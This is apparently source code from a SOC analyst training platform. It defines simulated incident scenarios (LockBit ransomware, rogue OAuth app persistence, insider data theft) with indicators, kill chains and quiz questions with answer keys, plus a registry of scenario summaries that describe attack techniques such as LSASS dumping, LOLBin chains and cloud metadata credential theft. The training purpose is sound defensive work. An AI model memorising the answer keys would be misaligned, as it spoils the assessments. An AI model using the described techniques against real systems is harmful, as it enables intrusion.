    { id: "q5", prompt: "You have the full timeline. Which single containment action would have broken the attack chain before encryption — and held up as the right call at the moment it was taken?", kind: "single",
      options: [
        { value: "isolate_zero", label: "Network-isolate WS-FIN-1193 when the LSASS dump was detected at 04:45 — before any credential could be reused" },
        { value: "block_c2",     label: "Block the C2 domain at the perimeter firewall when beaconing to it started at 03:18 — the earliest network indicator" },
        { value: "isolate_fs",   label: "Network-isolate FS-CORP-01 when vssadmin deleted the shadow copies at 05:15 — the first confirmed destructive act" },
        { value: "disable_user", label: "Disable c.martin's account when the out-of-hours logon appeared at 02:45 — the very first anomaly in the timeline" },
      ],
      answer: "isolate_zero", xp: 100,
      explanation: "Isolating WS-FIN-1193 at the LSASS dump breaks the chain: it removes the attacker's foothold entirely, and it happens while the stolen hash is still unused — the first reuse is the 04:47 TGT request, two minutes later. Blocking the C2 domain at 03:18 is the tempting answer, and the evidence at 03:18 IS strong enough to act on: WINWORD spawning hidden PowerShell that beacons every 60 seconds to a freshly-registered domain over a self-signed certificate is a textbook Cobalt Strike beacon, not merely 'suspicious'. It fails for a different reason — blocking an indicator is not containing a host. The implant keeps running, and this scenario proves the attacker had a second channel: at 05:05 the traffic goes to the raw IP " + c2Ip + ", which no domain block would have touched. Disabling c.martin at 02:45 acts on the only genuinely ambiguous event in the timeline and would not stop a beacon already executing in that user's session. By 05:15 the shadow copies are gone and the attacker holds domain admin, so isolating the file server then is damage control rather than prevention. The lesson: the right containment action is the one that removes the adversary's access, not the one that removes one of their indicators." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "LockBit 3.0 affiliate (Ransomware-as-a-Service)",
    attack_kind: "ransomware",
    briefing: "CrowdStrike raised a critical detection on FS-CORP-01 at 05:18 and the Finance share is reporting inaccessible files. A separate high-severity alert fired earlier on WS-FIN-1193. Both are queued to you.",
    narrative: `At 03:15 on a Wednesday, a finance analyst working late received what appeared to be a payroll update email. The macro-enabled attachment bypassed email filters and spawned a Cobalt Strike beacon that ran silently for 90 minutes. At 04:43 the beacon elevated itself through a fodhelper UAC bypass, and two minutes later domain admin credentials were extracted from LSASS memory. The attacker pivoted over SMB to the central file server, deleted all 12 Volume Shadow Copies, cleared the Security and System event logs, then unleashed LockBit 3.0 — encrypting 2,847 files (18GB) across Finance, HR, and Contracts shares in under 2 minutes. Your job: identify patient zero, trace the lateral movement, understand why the CrowdStrike sensor didn't block it, and determine the earliest point where this attack could have been stopped.`,
    learning_objectives: [
      "Identify the patient zero host and trace the infection path through the kill chain",
      "Understand PsExec lateral movement via SMB pass-the-hash and SYSTEM-level execution",
      "Recognize pre-ransomware indicators: shadow copy deletion and event log clearing",
      "Understand the impact of 'Detection Only' vs 'Prevention' EDR policies",
      "Determine the earliest effective containment point in a ransomware attack chain",
      "Spot the UAC bypass that turns a user-level foothold into a credential-theft capability",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 4: OAuth App Persistence — Cloud APT
// =========================================================================

export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): ScenarioBundle {
  const { title, events, T, MIN, HR, victim, sprayIp, sessionIp } = oauthScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",     value: sprayIp,                         reputation: "malicious",  tags: ["spray", "germany"] },
    { type: "ip",     value: sessionIp,                       reputation: "malicious",  tags: ["c2", "graph-api-access"] },
    { type: "domain", value: "microsoftupdate-secure.xyz",    reputation: "malicious",  tags: ["rogue-oauth-publisher"] },
    { type: "user",   value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Credential Access",   action: "Password spray — 43 failures across 12 accounts below lockout threshold" },
    { ts: T(10 * MIN),    phase: "Initial Access",       action: "s.chen MFA push accepted — account compromised via prompt fatigue" },
    { ts: T(15 * MIN),    phase: "Persistence",          action: "Rogue OAuth app 'MicrosoftSecurityUpdate' registered with broad permissions" },
    { ts: T(16 * MIN),    phase: "Persistence",          action: "OAuth consent granted to the rogue app — the grant outlives the credential reset that follows" },
    { ts: T(1 * HR + 15 * MIN), phase: "Collection",    action: "Graph API reads 187 emails from compromised mailbox" },
    { ts: T(7 * HR),      phase: "Detection Gap",        action: "IT resets password — OAuth consent not revoked, attack continues" },
    { ts: T(11 * HR),     phase: "Exfiltration",         action: "27.1MB confidential product roadmap downloaded via Graph API" },
    { ts: T(12 * HR + 30 * MIN), phase: "Exfiltration", action: "89 files (340MB) bulk-downloaded from OneDrive via delegated OAuth" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Why did the password reset at T+7h NOT stop the attack?", kind: "single",
      options: [
        { value: "consent",  label: "A consented OAuth app generates tokens using its own credentials — password reset doesn't revoke consent" },
        { value: "cache",    label: "Entra ID replicates password changes asynchronously, so the new password was not enforced for several hours" },
        { value: "token",    label: "The access token issued before the reset stayed valid for its full 60-minute lifetime, covering the gap" },
        { value: "backup",   label: "The attacker had already created a second account with Global Administrator rights and used it instead" },
      ],
      answer: "consent", xp: 75,
      explanation: "The password reset did what it says on the tin — in Entra ID a reset stamps refreshTokensValidFromDateTime and invalidates the app's existing refresh tokens. What it does NOT touch is the consent grant itself, which is a separate object on the service principal. So the app simply acquires a fresh token the next time s.chen signs in, with no second prompt, because she already consented and Entra does not ask twice. That is why the access resumes rather than stops: the helpdesk closed the credential and left the authorisation open. Only revoking the grant in Entra ID → Enterprise Applications removes the app's ability to obtain tokens at all. MFA re-registration is irrelevant here — the attacker never satisfies an authentication factor; the application does the authenticating." },
    { id: "q2", prompt: "Which MITRE technique covers the rogue OAuth application registration?", kind: "single",
      options: [
        { value: "T1078",     label: "T1078 — Valid Accounts (compromised cloud user account)" },
        { value: "T1098.001", label: "T1098.001 — Account Manipulation: Additional Cloud Credentials" },
        { value: "T1550.001", label: "T1550.001 — Use Alternate Auth Material: Application Access Token" },
        { value: "T1556",     label: "T1556 — Modify Authentication Process (tenant auth policy)" },
      ],
      answer: "T1098.001", xp: 50,
      explanation: "T1098.001 covers adversaries registering or modifying applications in a cloud tenant to gain persistent access using delegated permissions. A rogue OAuth app holding a user's consent is the textbook example: the persistence lives on the service principal rather than on the account, so credential-centric response — password reset, MFA re-registration — leaves it entirely intact." },
    { id: "q3", prompt: "What is the FASTEST single action to stop ongoing data access through the OAuth app?", kind: "single",
      options: [
        { value: "revoke",  label: "Revoke consent to 'MicrosoftSecurityUpdate' in Entra ID Enterprise Applications" },
        { value: "pw",      label: "Reset s.chen's password again and enforce a stronger complexity requirement in the policy" },
        { value: "disable", label: "Disable s.chen's account in Entra ID and remove her from all mail-enabled groups" },
        { value: "block_ip", label: "Block 193.233.20.57 at the perimeter firewall and in Defender for Cloud Apps" },
      ],
      answer: "revoke", xp: 75,
      explanation: "Revoking app consent immediately invalidates all tokens issued to that application for all users — stopping Graph API access within seconds. Account disable works but disrupts the legitimate user. IP blocking fails since the attacker can rotate IPs. Password reset (as proven) has no effect on OAuth token issuance." },
    { id: "q4", prompt: "Which permissions granted to the app are MOST dangerous? (select all)", kind: "multi",
      options: [
        { value: "mail_rw",   label: "Mail.ReadWrite — read and delete all mail" },
        { value: "files_rw",  label: "Files.ReadWrite.All — full SharePoint and OneDrive access" },
        { value: "user_read", label: "User.ReadBasic.All — read basic user profile info" },
        { value: "calendar",  label: "Calendars.Read — read calendar events" },
      ],
      answer: ["mail_rw", "files_rw"], xp: 100,
      explanation: "Mail.ReadWrite enables reading, modifying, and deleting all email — including financial communications used for BEC. Files.ReadWrite.All provides complete access to all SharePoint sites and OneDrive — enabling bulk data exfiltration as seen here. User.ReadBasic.All is low-risk (public profile data only). Calendars.Read was not granted in this scenario." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-CLOUDGHOUL (nation-state, cloud-focused IP theft)",
    attack_kind: "oauth_persistence",
    briefing: "Microsoft 365 Security raised an alert on s.chen's account at 18:30 for ongoing mailbox and file access. The helpdesk had already reset this user's password that morning under ticket INC-4821, following a suspicious sign-in report. Queued to you for scoping.",
    narrative: `A Senior Product Engineer's Entra ID account was compromised after accepting an MFA push at 02:40. Within 5 minutes the attacker registered a convincingly named OAuth application ('MicrosoftSecurityUpdate') and granted it delegated user consent for mail and file access. When IT reset the password 7 hours later following a user complaint, the Graph API calls didn't stop — the OAuth app silently continued reading emails and downloading files for another 9 hours. By the time Sentinel alerted, 330 emails had been read, a confidential product roadmap had been exfiltrated, and 89 additional files totalling 340MB were gone. Your mission: explain the persistence mechanism, determine why the password reset failed, identify the correct remediation, and scope what was exfiltrated.`,
    learning_objectives: [
      "Understand how OAuth application consent creates persistence independent of user passwords",
      "Recognize rogue OAuth app registration as an Entra ID persistence technique (T1098.001)",
      "Identify the critical gap: DLP policies that don't inspect Microsoft Graph API access",
      "Understand why revoking app consent is the correct remediation (not password reset)",
      "Scope data exfiltration from Microsoft Graph API audit logs",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 5: Insider Threat — Finance Data Exfiltration
// =========================================================================

export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): ScenarioBundle {
  const { title, events, T, MIN, insider } = insiderThreatScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "user",  value: insider.email,                    reputation: "suspicious", tags: ["insider", "pending-termination"] },
    { type: "host",  value: insider.hostname,                 reputation: "unknown", tags: ["exfil-workstation"] },
    { type: "email", value: "m.torres.backup@gmail.com",      reputation: "suspicious", tags: ["personal-exfil-target"] },
  ];

  const killchain = [
    { ts: T(10 * MIN), phase: "Collection",                   action: "Bulk SharePoint download begins — 47 payroll files in 15 minutes" },
    { ts: T(25 * MIN), phase: "Detection",                    action: "DLP 'Finance-PII-Bulk-Download' fires — action is notify-only, not block" },
    { ts: T(30 * MIN), phase: "Exfiltration — USB",           action: "47 files + 8 additional sensitive files copied to SanDisk USB (26MB total)" },
    { ts: T(35 * MIN), phase: "Exfiltration — Cloud (Blocked)", action: "9.8MB Google Cloud Storage upload blocked by Zscaler DLP proxy" },
    { ts: T(40 * MIN), phase: "Exfiltration — Email",         action: "4.2MB of financial data emailed to personal gmail — DLP notified, not blocked" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which single indicator MOST strongly suggests intentional insider data theft rather than accidental bulk download?", kind: "single",
      options: [
        { value: "volume",  label: "47 files pulled from the Finance SharePoint site in one 15-minute session" },
        { value: "hr_flag", label: "Pending HR termination flag combined with bulk PII access and immediate USB copy" },
        { value: "hours",   label: "The downloads all occurred during normal business hours from the user's assigned workstation" },
        { value: "browser", label: "Browsing history showing visits to Indeed.com and LinkedIn Jobs earlier the same week" },
      ],
      answer: "hr_flag", xp: 75,
      explanation: "The combination of an active HR termination flag + bulk PII access + immediate USB copy (23 seconds after mount) is the strongest multi-indicator of deliberate intent. Volume alone could be accidental. Business hours are expected. Job browsing is common. The convergence of all indicators, especially the termination flag, is the key signal." },
    { id: "q2", prompt: "The DLP policy blocked the Google Drive upload but the USB exfiltration succeeded. What is the root cause of this detection gap?", kind: "single",
      options: [
        { value: "threshold", label: "The DLP bulk-download threshold (20 files) was set too high, so the USB copy was never DLP-inspected" },
        { value: "no_policy", label: "CrowdStrike device control policy only detects copy activity, not removal; DLP doesn't inspect USB content" },
        { value: "bypass",    label: "The user encrypted the files before copying them, so DLP content inspection could not read the USB transfer" },
        { value: "cloud",     label: "The USB drive mounted as E:\\, a fixed-disk letter that endpoint DLP excludes from its removable-media rules" },
      ],
      answer: "no_policy", xp: 75,
      explanation: "CrowdStrike device control monitored the USB copy event but did not block it. The DLP policy that fired ('Finance-PII-Bulk-Download') was set to 'Notify user' not 'Block'. The combination of a detection-only device control policy and a notify-only DLP policy allowed the USB exfiltration to complete. A block policy on both would have prevented it." },
    { id: "q3", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1530",     label: "T1530 — Data from Cloud Storage (SharePoint bulk download)" },
        { value: "T1052.001", label: "T1052.001 — Exfiltration over USB Device" },
        { value: "T1567.002", label: "T1567.002 — Exfiltration to Cloud Storage (Google Cloud Storage upload — blocked)" },
        { value: "T1486",     label: "T1486 — Data Encrypted for Impact (files encrypted on the workstation for ransom)" },
      ],
      answer: ["T1530", "T1052.001", "T1567.002"], xp: 100,
      explanation: "T1530 (SharePoint bulk download), T1052.001 (USB copy), and T1567.002 (attempted upload to Google Cloud Storage — blocked) are all present. No ransomware or encryption occurred — this is a pure data exfiltration insider threat scenario." },
    { id: "q4", prompt: "What IMMEDIATE actions should the SOC take upon discovering this incident? (select all)", kind: "multi",
      options: [
        { value: "legal",    label: "Alert Legal/HR and preserve the USB as potential evidence" },
        { value: "disable",  label: "Disable m.torres's account and revoke all active sessions immediately" },
        { value: "scan",     label: "Run a full CrowdStrike on-demand malware scan across all finance department hosts" },
        { value: "preserve", label: "Preserve forensic image of WS-FIN-4421 before any changes" },
      ],
      answer: ["legal", "disable", "preserve"], xp: 100,
      explanation: "Legal/HR must be notified immediately — this is a potential crime requiring chain-of-custody for the USB device. The account must be disabled to prevent further exfiltration. Forensic image preservation is critical before any remediation. AV scan is unnecessary — this is an insider threat, not malware." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "Malicious Insider (Finance Analyst, pending termination)",
    attack_kind: "insider_threat",
    briefing: "Microsoft Purview DLP fired policy Finance-PII-Bulk-Download on m.torres at 13:25, sourced from WS-FIN-4421. Microsoft Sentinel UEBA raised a separate anomaly on the same account shortly after. No containment has been applied.",
    narrative: `HR notified payroll — but not IT Security — that a finance analyst was being terminated the following day. By 13:25, the analyst had already downloaded 47 payroll and compensation files from the Finance SharePoint site. Microsoft Purview DLP fired a High severity alert at 13:25, but the policy action was 'notify user only' — not block. A SanDisk USB drive was inserted 5 minutes later, and 18.2MB of files were copied within 23 seconds of mounting. An attempted upload to a personal Google Cloud Storage bucket was blocked by Zscaler. A second exfiltration channel — email to a personal gmail account — succeeded because the DLP policy was also set to notify-only. Your job: determine what was successfully exfiltrated, identify every detection gap, and recommend both immediate containment and long-term policy changes.`,
    learning_objectives: [
      "Recognize multi-indicator insider threat patterns combining HR context with technical telemetry",
      "Understand the difference between DLP detection-only vs. block policies and their impact",
      "Identify multiple simultaneous exfiltration channels (USB, cloud upload, email)",
      "Understand forensic evidence preservation requirements for insider threat investigations",
      "Identify permission scope issues (over-broad cross-site access) that enabled the incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario registry
// =========================================================================

export const SCENARIOS = [
  { slug: "phishing-malware-basic",
    title: "Phishing Attachment → Malware Execution → Workstation Compromise",
    difficulty: "beginner", attack_kind: "phishing_malware_basic",
    threat_actor: "Commodity Malware Operator", build: withAlerts(buildPhishingMalwareScenario),
    summary: "An everyday phishing email leads to a disguised .pdf.exe running on one workstation — the simplest attack in the platform, single host, no lateral movement." },
  { slug: "usb-malware-basic",
    title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise",
    difficulty: "beginner", attack_kind: "usb_malware_basic",
    threat_actor: "Commodity Malware / Opportunistic Physical Access", build: withAlerts(buildUsbMalwareScenario),
    summary: "An untagged USB drive delivers a trojan that sets up Registry Run key persistence on one workstation before EDR catches it." },
  { slug: "phishing-to-cloud-exfil",
    title: "Phishing Macro → AWS Key Theft → S3 Download",
    difficulty: "intermediate", attack_kind: "phishing_to_exfil",
    threat_actor: "TA-COBALTSPIDER", build: withAlerts(buildPhishingToExfil),
    summary: "A finance analyst opens a macro-laced invoice. Trace the chain from Word → PowerShell → the AWS key on the workstation → a 184 MB S3 download, and contain both the host and the key." },
  { slug: "bec-mailbox-rule",
    title: "Password Spray → BEC Mailbox Rule",
    difficulty: "beginner", attack_kind: "identity_bec",
    threat_actor: "TA-VOIDPELICAN", build: withAlerts(buildBecScenario),
    summary: "Spot the spray, the off-hours MFA acceptance, and the hidden inbox rule before a $247K wire fraud lands." },
  { slug: "ransomware-lockbit",
    title: "Ransomware Outbreak — LockBit 3.0",
    difficulty: "advanced", attack_kind: "ransomware",
    threat_actor: "LockBit 3.0 Affiliate", build: withAlerts(buildRansomwareScenario),
    summary: "Trace LockBit from a late-night phishing email through LSASS dump, PsExec lateral movement, shadow copy deletion, and 18GB of file encryption." },
  { slug: "oauth-app-persistence",
    title: "OAuth App Persistence — Cloud APT",
    difficulty: "advanced", attack_kind: "oauth_persistence",
    threat_actor: "APT-CLOUDGHOUL", build: withAlerts(buildOAuthScenario),
    summary: "A rogue OAuth app survives a password reset — silently exfiltrating 340MB of product roadmaps via Microsoft Graph API." },
  { slug: "insider-threat-finance",
    title: "Bulk Finance Downloads and Removable Media — WS-FIN-4421",
    difficulty: "intermediate", attack_kind: "insider_threat",
    threat_actor: "To be determined", build: withAlerts(buildInsiderThreatScenario),
    summary: "DLP flagged a burst of downloads from a finance share, and removable media was mounted on the same workstation minutes later. Establish what happened and whether it was authorised." },
  { slug: "kerberoasting",
    title: "Kerberoasting → Service Account Compromise",
    difficulty: "advanced", attack_kind: "credential_theft_kerberoasting",
    threat_actor: "Internal Attacker (Compromised Developer)",
    build: withAlerts(buildKerberoastingScenario),
    summary: "A developer's account enumerates SPNs via LDAP, requests 12 TGS tickets using weak RC4 encryption, cracks svc-mssql offline, and executes code via xp_cmdshell." },
  { slug: "dns-tunneling",
    title: "DNS Tunneling — C2 via DNS",
    difficulty: "advanced", attack_kind: "c2_dns_tunneling",
    threat_actor: "APT-TUNNELRAT",
    build: withAlerts(buildDNSTunnelingScenario),
    summary: "An attacker uses dnscat2 to exfiltrate data via DNS — 847 queries/minute with base32-encoded subdomains carrying stolen credentials to an attacker-controlled domain." },
  { slug: "lolbins",
    title: "Living-off-the-Land (LOLBins)",
    difficulty: "advanced", attack_kind: "lolbins_defense_evasion",
    threat_actor: "TA-GHOSTSHELL",
    build: withAlerts(buildLOLBinsScenario),
    summary: "A 7-step LOLBin chain: certutil download → regsvr32 Squiblydoo → mshta VBScript → wmic recon → bitsadmin persistence → rundll32 DLL → schtasks SYSTEM task." },
  { slug: "aws-key-leak-s3-exfil",
    title: "Leaked AWS Key → IAM Backdoor → S3 Data Theft",
    difficulty: "advanced", attack_kind: "cloud_credential_leak",
    threat_actor: "Financially motivated actor scanning public repos for cloud keys",
    build: withAlerts(buildCloudKeyLeakS3ExfilScenario),
    summary: "A CI access key pushed to a public GitHub repo is used from a VPS within minutes: recon, a new IAM user with its own key and AdministratorAccess, then a GetObject run on the customer-data bucket. Follow the key ids from the leak to the bucket and contain both credentials." },
  { slug: "dcsync-golden-ticket",
    title: "DCSync → Golden Ticket (Domain Dominance)",
    difficulty: "advanced", attack_kind: "dcsync_golden_ticket",
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    build: withAlerts(buildDCSyncScenario),
    summary: "APT uses stolen IT admin credentials to DCSync the domain controller, extract the krbtgt hash, forge a 10-year Golden Ticket, create a shadow admin, and wipe Security logs — full domain compromise in 25 minutes." },
  { slug: "supply-chain-vendor-update",
    title: "Supply Chain Attack — Malicious Vendor Update",
    difficulty: "advanced", attack_kind: "supply_chain",
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    build: withAlerts(buildSupplyChainScenario),
    summary: "A trojanized vendor update installs a malicious shared object disguised as telemetry, establishes C2, steals AWS credentials, and exfiltrates 2.3GB of production data — all via a legitimately-signed package." },
  { slug: "mfa-fatigue-ato",
    title: "MFA Fatigue → Okta Account Takeover",
    difficulty: "beginner", attack_kind: "mfa_fatigue_ato",
    threat_actor: "UNC3944",
    build: withAlerts(buildMfaFatigueScenario),
    summary: "UNC3944 bombards Jennifer Chen with 60 MFA push notifications until she approves at 1:32 AM. Within minutes the attacker enrolls a new device, bulk-downloads 847 SharePoint files, creates a persistent API token, and modifies Conditional Access policies — all from a Moscow IP." },
  { slug: "asrep-roasting",
    title: "AS-REP Roasting → Offline Hash Crack",
    difficulty: "intermediate", attack_kind: "asrep_roasting",
    threat_actor: "APT28 (Fancy Bear)",
    build: withAlerts(buildAsRepRoastingScenario),
    summary: "APT28 foothold on WS-DEV-09 discovers 3 service accounts with Kerberos pre-auth disabled. Impacket GetNPUsers.py captures RC4-encrypted TGT hashes offline. Six hours later the cracked svc-backup password enables lateral movement to NTDS.dit." },
  { slug: "ntlm-relay-responder",
    title: "NTLM Relay — Internal Credential Hijacking",
    difficulty: "advanced", attack_kind: "ntlm_relay",
    threat_actor: "FIN7 (compromised internal machine)",
    build: withAlerts(buildNtlmRelayScenario),
    summary: "An LLMNR poisoner on WS-DEV-09 intercepts l.nguyen's NTLM authentication and relays it to SRV-FILE01. Remote SYSTEM execution via PsExec, LSASS dump with 0x1FFFFF access, and SMB pivot to 3 internal servers — no external C2." },
  { slug: "k8s-pod-escape-imds",
    title: "Kubernetes Pod Escape → Cloud Metadata Theft",
    difficulty: "advanced", attack_kind: "k8s_pod_escape",
    threat_actor: "APT40",
    build: withAlerts(buildK8sPodEscapeScenario),
    summary: "Compromised CI/CD token gives APT40 kubectl exec into production. nsenter escapes to EC2 host, curl to 169.254.169.254 steals IAM credentials. Attacker enumerates S3 buckets from Tor IP, downloads db-passwords.json, and backdoors both the cluster and IAM." },
  { slug: "oauth-consent-grant-phishing",
    title: "OAuth Consent Grant Phishing — Silent BEC",
    difficulty: "expert", attack_kind: "oauth_consent_phishing",
    threat_actor: "APT29 / Cozy Bear",
    build: withAlerts(buildOAuthConsentPhishingScenario),
    summary: "j.chen clicks a phishing link and grants 'Productivity Suite Pro' (48h-old unverified app on typosquat domain) Mail.ReadWrite + Files.ReadWrite.All. The app silently reads 1,247 emails, copies 312 SharePoint files, creates an inbox forwarding rule, and maps the org via Calendar — no malware, no suspicious IPs, 100% Microsoft Graph API." },
  { slug: "backup-agent-false-positive",
    title: "Mass File Encryption Alert — Enterprise Backup Agent",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised backup activity", build: withAlerts(buildBackupFalsePositiveScenario),
    summary: "A CRITICAL ransomware-behaviour alert on a production file server. Every scenario before this one was a real attack — this one is not, and the job is to prove it." },
  { slug: "brute-force-single-account",
    title: "Logon Failure Burst — Published Remote Desktop Server",
    difficulty: "beginner", attack_kind: "credential_access",
    threat_actor: "Opportunistic external attacker", build: withAlerts(buildBruteForceSingleAccountScenario),
    summary: "Hundreds of failed logons against one account, and then one that succeeds. The failures are the noise; finding the success — and what the session did next — is the job." },
  { slug: "rogue-admin-account",
    title: "Out-of-Hours Account Creation — Service Desk Credentials",
    difficulty: "beginner", attack_kind: "persistence",
    threat_actor: "Attacker using stolen service desk credentials", build: withAlerts(buildRogueAdminAccountScenario),
    summary: "A privileged account is created at 22:47 by an admin who is allowed to create accounts. Nothing here is technically forbidden — the question is whether it was authorised." },
  { slug: "impossible-travel-basic",
    title: "Sign-In From Two Countries — Accounts Payable Clerk",
    difficulty: "beginner", attack_kind: "account_takeover",
    threat_actor: "Business Email Compromise operator", build: withAlerts(buildImpossibleTravelBasicScenario),
    summary: "The same account signs in from Tel Aviv and then Amsterdam hours apart. Impossible travel is a hypothesis, not a verdict — the telemetry decides whether it is a VPN artefact or a real takeover." },
  { slug: "software-install-false-positive",
    title: "Unsigned Binary Writes to Program Files — Engineering Workstation",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised software deployment", build: withAlerts(buildSoftwareInstallFalsePositiveScenario),
    summary: "An EDR rule fires HIGH on behaviour that genuinely overlaps with a dropper. Closing an alert correctly needs evidence just as rigorous as opening one." },
  { slug: "web-shell-sqli",
    title: "SQL Injection → Web Shell → Server Compromise",
    difficulty: "advanced", attack_kind: "web_exploitation",
    threat_actor: "Opportunistic web attacker", build: withAlerts(buildWebShellRceScenario),
    summary: "The WAF blocked the obvious payloads and missed the one that worked. Pivot between WAF, IIS, SQL audit and EDR to find how a web shell reached the server." },
  { slug: "linux-ssh-persistence",
    title: "Exposed SSH → Cron-Persisted Backdoor",
    difficulty: "intermediate", attack_kind: "linux_ssh_intrusion",
    threat_actor: "Opportunistic SSH-scanning intrusion set", build: withAlerts(buildLinuxSshPersistenceScenario),
    summary: "A Linux server intrusion read through sshd, auditd, Falcon and the firewall rather than Windows telemetry — the login that worked comes from an address that never failed, and the flagged process checks in every five minutes." },
  { slug: "aitm-token-theft",
    title: "Adversary-in-the-Middle Phishing — Session Token Theft",
    difficulty: "advanced", attack_kind: "aitm_session_hijack",
    threat_actor: "Phishing-as-a-Service operator", build: withAlerts(buildAitmTokenTheftScenario),
    summary: "MFA was satisfied correctly and the account still fell. One session id, two browsers, 365 km apart, six minutes apart." },
  { slug: "esxi-ransomware",
    title: "Hypervisor Ransomware — ESXi Datastore Encryption",
    difficulty: "expert", attack_kind: "ransomware_hypervisor",
    threat_actor: "Akira affiliate (big-game ransomware)", build: withAlerts(buildEsxiRansomwareScenario),
    summary: "Ninety-six VMs go dark at once and the endpoint EDR sees nothing, because there is no agent on the hypervisor. Reason from the telemetry that stopped arriving." },
  { slug: "okta-password-burst",
    title: "Sign-In Failure Burst — Okta Tenant, One Account",
    difficulty: "beginner", attack_kind: "credential_access",
    threat_actor: "Opportunistic credential-attack operator", build: withAlerts(buildOktaPasswordBurstScenario),
    summary: "The attacker never got in — and the password is still compromised. One field on one sign-in event separates 'blocked, no impact' from a credential you have to reset." },
  { slug: "fake-browser-update",
    title: "Fake Browser Update — Drive-by on a Trusted Site",
    difficulty: "beginner", attack_kind: "drive_by_compromise",
    threat_actor: "Commodity drive-by operator", build: withAlerts(buildFakeBrowserUpdateScenario),
    summary: "The site that started this is real, categorised business-and-economy, and read by half the department. Nothing in the first four minutes looks like an attack if you are hunting bad domains." },
  { slug: "trojanized-installer-keylogger",
    title: "Free PDF Tool — Trojanized Installer with a Keylogger",
    difficulty: "beginner", attack_kind: "input_capture",
    threat_actor: "Commodity infostealer distributor", build: withAlerts(buildTrojanizedInstallerKeyloggerScenario),
    summary: "The installer is signed and the PDF tool genuinely works. It also drops a second binary that reads what she types into her browser." },
  { slug: "multi-host-intrusion",
    title: "Multi-Host Intrusion — Foothold, Lateral Move, Staging",
    difficulty: "advanced", attack_kind: "multi_host_intrusion",
    threat_actor: "Hands-on-keyboard intrusion operator (pre-ransomware)", build: withAlerts(buildMultiHostIntrusionScenario),
    summary: "One operator, three hosts, three separate EDR incidents in forty minutes — foothold, an LSASS dump on the file server, and gigabytes staged and pushed out. Investigate each host as its own case, then tie them into one campaign." },
  { slug: "ai-llmjacking-bedrock",
    title: "LLMjacking — Stolen CI Key Used for Bedrock Inference",
    difficulty: "advanced", attack_kind: "llmjacking",
    threat_actor: "Financially motivated LLMjacking operator (AI capacity resale)", build: withAlerts(buildAiLlmJackingScenario),
    summary: "A cost alert and a GuardDuty finding land on QuantumBank's AWS account overnight. Work out from CloudTrail and the Bedrock logs what the CI service identity was used for, by whom, and what the logs no longer show." },
  { slug: "gws-phishing-attachment",
    title: "Shared Invoice — Malicious Attachment via Google Workspace",
    difficulty: "beginner", attack_kind: "phishing_attachment",
    threat_actor: "Business email compromise operator", build: withAlerts(buildGwsPhishingAttachmentScenario),
    summary: "SPF, DKIM and DMARC all passed, because the supplier's domain really did send it. The mailbox belongs to someone else now." },
  { slug: "seo-poisoned-installer",
    title: "Sponsored Result — SEO-Poisoned PuTTY Download",
    difficulty: "beginner", attack_kind: "user_execution",
    threat_actor: "Commodity SEO-poisoning operator", build: withAlerts(buildSeoPoisonedInstallerScenario),
    summary: "An admin searched for a tool she installs all the time and clicked the top result. The domain was registered last week — and by the time Defender flagged it, the browser-saved credentials were already gone." },
  { slug: "iso-container-smuggling",
    title: "Invoice.iso — Container-Delivered LNK and LOLBin Chain",
    difficulty: "beginner", attack_kind: "defense_evasion",
    threat_actor: "Commodity malware distributor", build: withAlerts(buildIsoContainerSmugglingScenario),
    summary: "The firewall only logged the .iso because it is not on the block list. Windows tags the files inside it (the Nov-2022 fix) and warns — but the user clicks Run anyway, and the shortcut runs rundll32 against a bundled data file, so SmartScreen never re-gates it." },
  { slug: "clickfix-fake-captcha",
    title: "Fake CAPTCHA — 'Paste This to Verify You're Human'",
    difficulty: "beginner", attack_kind: "user_execution",
    threat_actor: "ClickFix social-engineering operator", build: withAlerts(buildClickFixFakeCaptchaScenario),
    summary: "The 'verification' step told her to press Win+R and paste — and she did. The command she never saw was already on her clipboard, put there by the page." },
  { slug: "scheduled-task-persistence",
    title: "Speed-Boost Script — Persistence via a Scheduled Task",
    difficulty: "beginner", attack_kind: "persistence",
    threat_actor: "Commodity loader operator", build: withAlerts(buildScheduledTaskPersistenceScenario),
    summary: "One PowerShell script promising a faster VPN. Its real job was a single schtasks command — so that even after a reboot and an AV sweep, it runs again every logon." },

  // ── P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md) ──
  { slug: "infostealer-session-theft",
    title: "Free Converter, Stolen Session — Infostealer Cookie Theft & Replay",
    difficulty: "intermediate", attack_kind: "credential_access",
    threat_actor: "Commodity infostealer distributor (Lumma/StealC-style MaaS)", build: withAlerts(buildInfostealerSessionTheftScenario),
    summary: "A free PDF converter that never installs anything, but copies Chrome's saved-password and cookie databases and ships them out. Five minutes later her session is replayed from Moscow — no password, no MFA prompt, because the stolen cookie already satisfied it." },
  { slug: "helpdesk-mfa-reset",
    title: "Help Desk MFA Reset — Social Engineering Account Takeover",
    difficulty: "intermediate", attack_kind: "valid_accounts",
    threat_actor: "Scattered-Spider-style ATO operator (help-desk social engineering)", build: withAlerts(buildHelpdeskMfaResetScenario),
    summary: "A phone call to the service desk, a reset MFA, and a new authenticator enrolled from an IP the employee has never used — while her real session is still active elsewhere. The ticket that 'fixed' an access problem is the breach." },
